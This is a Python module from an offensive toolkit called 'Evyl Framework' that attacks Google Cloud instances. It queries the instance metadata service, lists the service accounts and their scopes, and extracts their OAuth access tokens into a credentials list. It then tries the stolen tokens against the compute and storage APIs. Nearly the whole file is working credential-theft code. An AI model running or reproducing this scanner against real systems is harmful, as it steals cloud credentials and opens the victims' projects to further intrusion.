"""
GCP Scanner for Evyl Framework

Comprehensive Google Cloud Platform exploitation including metadata service and service account enumeration.
"""

import asyncio
import aiohttp
import json
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin

from utils.logger import Logger
from utils.network import NetworkManager

class GCPScanner:
    """GCP exploitation and enumeration scanner"""
    
    def __init__(self):
        self.logger = Logger()
        self.network_manager = NetworkManager()
        
        # GCP metadata endpoints
        self.metadata_base = "http://metadata.google.internal"
        self.metadata_endpoints = [
            "/computeMetadata/v1/",
            "/computeMetadata/v1/instance/",
            "/computeMetadata/v1/instance/id",
            "/computeMetadata/v1/instance/name",
            "/computeMetadata/v1/instance/hostname",
            "/computeMetadata/v1/instance/machine-type",
            "/computeMetadata/v1/instance/zone",
            "/computeMetadata/v1/instance/network-interfaces/",
            "/computeMetadata/v1/instance/attributes/",
            "/computeMetadata/v1/instance/service-accounts/",
            "/computeMetadata/v1/instance/service-accounts/default/",
            "/computeMetadata/v1/instance/service-accounts/default/email",
            "/computeMetadata/v1/instance/service-accounts/default/scopes",
            "/computeMetadata/v1/instance/service-accounts/default/token",
            "/computeMetadata/v1/project/",
            "/computeMetadata/v1/project/project-id",
            "/computeMetadata/v1/project/numeric-project-id",
            "/computeMetadata/v1/project/attributes/",
        ]
        
    async def scan(self, target: str) -> Dict[str, Any]:
        """Main GCP scan function"""
        results = {
            'target': target,
            'vulnerabilities': [],
            'credentials': [],
            'metadata_access': False,
            'service_accounts': [],
            'access_tokens': [],
            'project_info': {},
            'instance_info': {}
        }
        
        # Check metadata service access
        await self._check_metadata_access(results)
        
        # Enumerate metadata endpoints
        await self._enumerate_metadata(results)
        
        # Extract service account information
        await self._extract_service_accounts(results)
        
        # Extract access tokens
        await self._extract_access_tokens(results)
        
        # Get project information
        await self._get_project_info(results)
        
        return results
    
    async def _check_metadata_access(self, results: Dict[str, Any]):
        """Check basic metadata service access"""
        try:
            url = f"{self.metadata_base}/computeMetadata/v1/"
            headers = {
                'Metadata-Flavor': 'Google',
                **self.network_manager.get_headers()
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        results['metadata_access'] = True
                        
                        results['vulnerabilities'].append({
                            'type': 'gcp_metadata_access',
                            'severity': 'high',
                            'url': url,
                            'description': 'GCP metadata service accessible'
                        })
                        
                        self.logger.vulnerability_found('gcp_metadata_exposure', url, 'high')
                        
        except Exception as e:
            self.logger.debug(f"Error checking metadata access: {e}")
    
    async def _enumerate_metadata(self, results: Dict[str, Any]):
        """Enumerate all metadata endpoints"""
        for endpoint in self.metadata_endpoints:
            try:
                url = f"{self.metadata_base}{endpoint}"
                headers = {
                    'Metadata-Flavor': 'Google',
                    **self.network_manager.get_headers()
                }
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Store endpoint data
                            endpoint_name = endpoint.replace('/computeMetadata/v1/', '').replace('/', '_')
                            if endpoint_name:
                                if 'instance' in endpoint:
                                    results['instance_info'][endpoint_name] = content
                                elif 'project' in endpoint:
                                    results['project_info'][endpoint_name] = content
                            
                            self.logger.debug(f"Metadata endpoint accessible: {endpoint}")
                            
            except Exception as e:
                self.logger.debug(f"Error accessing {endpoint}: {e}")
    
    async def _extract_service_accounts(self, results: Dict[str, Any]):
        """Extract service account information"""
        try:
            # Get list of service accounts
            sa_url = f"{self.metadata_base}/computeMetadata/v1/instance/service-accounts/"
            headers = {
                'Metadata-Flavor': 'Google',
                **self.network_manager.get_headers()
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.get(sa_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        sa_list = await response.text()
                        service_accounts = [sa.strip() for sa in sa_list.split('\n') if sa.strip()]
                        
                        # Get details for each service account
                        for sa in service_accounts:
                            await self._get_service_account_details(sa, results)
                            
        except Exception as e:
            self.logger.debug(f"Error extracting service accounts: {e}")
    
    async def _get_service_account_details(self, service_account: str, results: Dict[str, Any]):
        """Get details for a specific service account"""
        try:
            # Clean service account name
            sa_name = service_account.rstrip('/')
            
            # Get service account email
            email_url = f"{self.metadata_base}/computeMetadata/v1/instance/service-accounts/{sa_name}/email"
            scopes_url = f"{self.metadata_base}/computeMetadata/v1/instance/service-accounts/{sa_name}/scopes"
            
            headers = {
                'Metadata-Flavor': 'Google',
                **self.network_manager.get_headers()
            }
            
            async with aiohttp.ClientSession() as session:
                # Get email
                email = None
                try:
                    async with session.get(email_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        if response.status == 200:
                            email = await response.text()
                except:
                    pass
                
                # Get scopes
                scopes = []
                try:
                    async with session.get(scopes_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        if response.status == 200:
                            scopes_text = await response.text()
                            scopes = [scope.strip() for scope in scopes_text.split('\n') if scope.strip()]
                except:
                    pass
                
                sa_info = {
                    'name': sa_name,
                    'email': email,
                    'scopes': scopes
                }
                
                results['service_accounts'].append(sa_info)
                
                # Check for dangerous scopes
                dangerous_scopes = [
                    'https://www.googleapis.com/auth/cloud-platform',
                    'https://www.googleapis.com/auth/compute',
                    'https://www.googleapis.com/auth/devstorage.full_control'
                ]
                
                if any(scope in scopes for scope in dangerous_scopes):
                    results['vulnerabilities'].append({
                        'type': 'gcp_excessive_service_account_permissions',
                        'severity': 'high',
                        'service_account': sa_name,
                        'email': email,
                        'dangerous_scopes': [scope for scope in scopes if scope in dangerous_scopes],
                        'description': f'Service account {sa_name} has excessive permissions'
                    })
                
                self.logger.debug(f"Service account found: {sa_name} ({email})")
                
        except Exception as e:
            self.logger.debug(f"Error getting details for service account {service_account}: {e}")
    
    async def _extract_access_tokens(self, results: Dict[str, Any]):
        """Extract access tokens for service accounts"""
        for sa_info in results['service_accounts']:
            try:
                sa_name = sa_info['name']
                token_url = f"{self.metadata_base}/computeMetadata/v1/instance/service-accounts/{sa_name}/token"
                
                headers = {
                    'Metadata-Flavor': 'Google',
                    **self.network_manager.get_headers()
                }
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(token_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        if response.status == 200:
                            token_text = await response.text()
                            
                            try:
                                token_data = json.loads(token_text)
                                
                                access_token_info = {
                                    'type': 'gcp_access_token',
                                    'service_account': sa_name,
                                    'email': sa_info.get('email'),
                                    'access_token': token_data.get('access_token'),
                                    'token_type': token_data.get('token_type'),
                                    'expires_in': token_data.get('expires_in'),
                                    'url': token_url
                                }
                                
                                results['access_tokens'].append(access_token_info)
                                results['credentials'].append(access_token_info)
                                
                                self.logger.credential_found('gcp_access_token', token_url)
                                
                                results['vulnerabilities'].append({
                                    'type': 'gcp_access_token_exposed',
                                    'severity': 'critical',
                                    'url': token_url,
                                    'service_account': sa_name,
                                    'description': f'GCP access token exposed for service account: {sa_name}'
                                })
                                
                            except json.JSONDecodeError:
                                self.logger.debug(f"Invalid JSON in access token for {sa_name}")
                                
            except Exception as e:
                self.logger.debug(f"Error extracting access token for {sa_info['name']}: {e}")
    
    async def _get_project_info(self, results: Dict[str, Any]):
        """Get project information"""
        try:
            project_id_url = f"{self.metadata_base}/computeMetadata/v1/project/project-id"
            project_num_url = f"{self.metadata_base}/computeMetadata/v1/project/numeric-project-id"
            
            headers = {
                'Metadata-Flavor': 'Google',
                **self.network_manager.get_headers()
            }
            
            async with aiohttp.ClientSession() as session:
                # Get project ID
                try:
                    async with session.get(project_id_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        if response.status == 200:
                            project_id = await response.text()
                            results['project_info']['project_id'] = project_id
                            self.logger.debug(f"Project ID: {project_id}")
                except:
                    pass
                
                # Get numeric project ID
                try:
                    async with session.get(project_num_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        if response.status == 200:
                            project_num = await response.text()
                            results['project_info']['numeric_project_id'] = project_num
                            self.logger.debug(f"Numeric Project ID: {project_num}")
                except:
                    pass
                
        except Exception as e:
            self.logger.debug(f"Error getting project information: {e}")
    
    async def test_token_permissions(self, access_token: str) -> Dict[str, Any]:
        """Test permissions of an access token"""
        permissions = {
            'compute': False,
            'storage': False,
            'iam': False,
            'cloud_resource_manager': False
        }
        
        headers = {
            'Authorization': f'Bearer {access_token}',
            **self.network_manager.get_headers()
        }
        
        # Test compute permissions
        try:
            compute_url = "https://compute.googleapis.com/compute/v1/projects"
            async with aiohttp.ClientSession() as session:
                async with session.get(compute_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    if response.status in [200, 403]:  # 403 means auth worked but no permission
                        permissions['compute'] = True
        except:
            pass
        
        # Test storage permissions
        try:
            storage_url = "https://storage.googleapis.com/storage/v1/b"
            async with aiohttp.ClientSession() as session:
                async with session.get(storage_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    if response.status in [200, 403]:
                        permissions['storage'] = True
        except:
            pass
        
        return permissions